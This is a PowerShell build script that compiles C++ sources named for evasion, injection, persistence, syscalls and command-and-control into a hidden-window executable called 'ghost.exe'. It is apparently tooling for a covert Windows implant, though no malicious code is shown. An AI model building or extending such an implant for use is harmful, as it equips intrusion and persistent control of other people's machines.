$src = @("src\main.cpp", "src\syscalls.cpp", "src\evasion.cpp", "src\injection.cpp", "src\persistence.cpp", "src\c2.cpp", "src\utils.cpp")
$libs = "winhttp.lib", "wbemuuid.lib", "ole32.lib", "oleaut32.lib", "ntdll.lib", "advapi32.lib", "shell32.lib", "user32.lib"
$flags = "/EHsc /O2 /W4 /DUNICODE /D_UNICODE /D_CRT_SECURE_NO_WARNINGS /MT /Feghost.exe"
cl $flags $src "/link" $libs "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup"
if ($LASTEXITCODE -eq 0) { Write-Host "Build succeeded: ghost.exe" }